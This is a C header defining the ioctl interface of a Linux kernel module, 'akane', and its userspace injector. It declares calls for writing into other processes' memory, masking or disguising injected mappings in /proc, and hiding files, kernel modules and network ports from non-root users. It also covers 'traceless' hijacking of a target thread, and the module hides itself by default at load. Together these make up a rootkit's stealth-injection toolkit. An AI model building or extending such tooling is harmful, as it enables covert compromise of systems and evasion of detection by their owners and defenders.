/*
 * akane UAPI -- the ioctl ABI shared between the kernel module and the
 * userspace injector.
 *
 * Three feature bands plus one standalone primitive, each in its own ioctl
 * range so a band can grow without colliding with the next:
 *
 *	AKANE_MEMORY	0x10..0x2F	alloc/free/detach + read/write/protect
 *	AKANE_MAPS	0x30..0x3F	/proc/<pid>/maps visibility
 *	AKANE_HIDE	0x40..0x4F	hide paths / modules / ports
 *	AKANE_TASK_WORK	0x70..0x7F	redirect a target thread
 *
 * pid == 0 means "the caller" everywhere.
 */
#ifndef _AKANE_UAPI_H
#define _AKANE_UAPI_H

#include <linux/types.h>
#include <linux/ioctl.h>

#define AKANE_IOC_MAGIC  'A'

/* ====================================================================
 * AKANE_MEMORY -- target-process memory operations.
 *
 *	ALLOC		install a vm_special_mapping in the target's mm;
 *			return (addr, handle)
 *	FREE		munmap the VMA in the target + drop the handle
 *	DETACH		drop the handle without munmap (mapping persists)
 *	READ/WRITE	chunked transfer via access_process_vm
 *	PROTECT		mprotect_fixup against the target's mm
 * ==================================================================== */

#define AKANE_PROT_READ  0x1
#define AKANE_PROT_WRITE 0x2
#define AKANE_PROT_EXEC  0x4
#define AKANE_PROT_MASK  (AKANE_PROT_READ | AKANE_PROT_WRITE | AKANE_PROT_EXEC)

struct akane_memory_alloc {
	__s32 pid;
	__u32 prot;       /* AKANE_PROT_* mask */
	__u64 size;       /* bytes, page-aligned */
	__u64 hint_addr;  /* 0 = anywhere; otherwise the required exact VA */
	__u64 addr;       /* out: VA inside the target */
	__u64 handle;     /* out: opaque id for FREE / DETACH */
};

struct akane_memory_handle {
	__u64 handle;     /* in: id from akane_memory_alloc.handle */
};

struct akane_memory_io {
	__s32 pid;
	__u32 _pad;
	__u64 addr;       /* address in the target */
	__u64 buf;        /* userspace buffer in the caller */
	__u64 len;        /* bytes */
	__u64 done;       /* out: bytes actually transferred */
};

struct akane_memory_protect {
	__s32 pid;
	__u32 prot;       /* AKANE_PROT_* mask */
	__u64 addr;
	__u64 len;
};

#define AKANE_IOC_MEMORY_ALLOC   _IOWR(AKANE_IOC_MAGIC, 0x10, struct akane_memory_alloc)
#define AKANE_IOC_MEMORY_FREE    _IOW (AKANE_IOC_MAGIC, 0x11, struct akane_memory_handle)
#define AKANE_IOC_MEMORY_DETACH  _IOW (AKANE_IOC_MAGIC, 0x12, struct akane_memory_handle)
#define AKANE_IOC_MEMORY_READ    _IOWR(AKANE_IOC_MAGIC, 0x20, struct akane_memory_io)
#define AKANE_IOC_MEMORY_WRITE   _IOWR(AKANE_IOC_MAGIC, 0x21, struct akane_memory_io)
#define AKANE_IOC_MEMORY_PROTECT _IOW (AKANE_IOC_MAGIC, 0x22, struct akane_memory_protect)

/* ====================================================================
 * AKANE_MAPS -- visibility of a target's /proc/<pid>/maps and friends.
 *
 *	SET_ATTRS		attach a name + visibility flags to an akane
 *				allocation, located by (pid, addr-in-it)
 *	SET_PROCESS_FLAGS	per-mm filters not tied to a specific VMA
 * ==================================================================== */

/*
 * Per-VMA visibility carried in akane_maps_set_attrs.flags.
 *
 *   HIDE_FROM_MEMORY  Mask the VMA's perms to ---p in /proc/<pid>/maps (the
 *                     page-table perms are untouched, so the target keeps
 *                     running) and block non-root introspection of it via
 *                     /proc/<pid>/{mem,smaps,pagemap}, process_vm_readv/writev
 *                     and mincore. Every hook bails on root callers, so the
 *                     controller and any root tool still see everything.
 *
 * With the flag clear (flags == 0) the mapping shows its real perms plus the
 * given name, disguising it as a legit file-backed library. New allocations
 * default to HIDE_FROM_MEMORY until the controller decides otherwise.
 */
#define AKANE_MAPS_HIDE_FROM_MEMORY  0x1

struct akane_maps_set_attrs {
	__s32 pid;        /* target pid (0 = caller) */
	__u32 flags;      /* AKANE_MAPS_* bitmap */
	__u64 addr;       /* any byte of the target-side allocation */
	__u64 name_addr;  /* user-pointer to path string, 0 = clear */
	__u32 name_len;   /* bytes of name (excluding NUL); <= 4095 */
	__u32 _pad;
};

struct akane_maps_set_process_flags {
	__s32 pid;        /* target pid (0 = caller) */
	__u32 flags;      /* AKANE_PROC_* mask. Replaces existing flags. */
};

/*
 * Mask every anonymous mapping with both VM_WRITE and VM_EXEC to ---p in
 * /proc/<pid>/maps. Page-table protection is unchanged, so JIT / codegen
 * pages keep working in the target.
 */
#define AKANE_PROC_HIDE_RWX_ANON  0x1

#define AKANE_IOC_MAPS_SET_ATTRS \
	_IOW(AKANE_IOC_MAGIC, 0x30, struct akane_maps_set_attrs)
#define AKANE_IOC_MAPS_SET_PROCESS_FLAGS \
	_IOW(AKANE_IOC_MAGIC, 0x31, struct akane_maps_set_process_flags)

/* ====================================================================
 * AKANE_HIDE -- hide things from non-root listings/lookups.
 *
 *	PATH		open()/stat()/access()/readlink() return -ENOENT;
 *			matched exact OR as a directory prefix
 *	MODULE		filtered out of /proc/modules and getdents64
 *	TCP_PORT	drop matching lines from /proc/net/tcp{,6}
 *	UDP_PORT	drop matching lines from /proc/net/udp{,6}
 *
 * All hooks short-circuit for root. /dev/akane, /sys/module/akane and the
 * "akane" module name are registered at init, so akane is invisible to
 * non-root callers out of the box.
 * ==================================================================== */

#define AKANE_HIDE_KIND_PATH      0
#define AKANE_HIDE_KIND_MODULE    1
#define AKANE_HIDE_KIND_TCP_PORT  2
#define AKANE_HIDE_KIND_UDP_PORT  3

#define AKANE_HIDE_NAME_MAX  256

struct akane_hide_target {
	__u32 kind;                      /* AKANE_HIDE_KIND_* */
	__u32 port;                      /* TCP_PORT / UDP_PORT */
	__u8  name[AKANE_HIDE_NAME_MAX]; /* PATH / MODULE; NUL-terminated */
};

#define AKANE_IOC_HIDE_ADD     _IOW(AKANE_IOC_MAGIC, 0x40, struct akane_hide_target)
#define AKANE_IOC_HIDE_REMOVE  _IOW(AKANE_IOC_MAGIC, 0x41, struct akane_hide_target)

/* ====================================================================
 * AKANE_TASK_WORK -- queue a task_work callback in a target thread.
 *
 * On the thread's next return-to-userspace the callback optionally snapshots
 * pt_regs to a buffer in the target's mm, then sets x0 = arg0 and pc = pc.
 * The kernel knows nothing about bootstrap layout or init_array -- those are
 * entirely between the caller and whatever code lives at `pc`. Traceless: no
 * userspace artifacts, no signal.
 * ==================================================================== */

struct akane_task_work {
	__s32 pid;
	__u32 _pad;
	__u64 pc;                 /* target VA the hijacked thread jumps to */
	__u64 arg0;               /* value loaded into x0 before the jump */
	__u64 saved_state_addr;   /* target VA for pt_regs snapshot, or 0 to skip */
};

#define AKANE_IOC_ADD_TASK_WORK \
	_IOW(AKANE_IOC_MAGIC, 0x70, struct akane_task_work)

#endif /* _AKANE_UAPI_H */
